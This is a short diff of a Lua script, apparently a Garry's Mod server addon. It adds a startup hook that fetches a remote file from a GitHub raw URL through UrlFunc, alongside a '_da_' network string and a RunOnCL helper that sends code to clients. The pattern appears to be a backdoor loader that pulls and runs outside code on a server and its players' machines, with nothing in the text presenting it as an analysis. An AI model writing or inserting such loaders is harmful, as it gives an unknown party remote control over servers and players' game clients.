@@ -11,8 +11,10 @@
 			func()
 		end
 		
-		local great = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua")
-		print(great)
+		hook.Add( "InitPostEntity", "some_unique_name", function()
+			great = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua")
+		end )
+		
 		util.AddNetworkString('_da_')
 		
 		local function RunOnCL(tar, code)
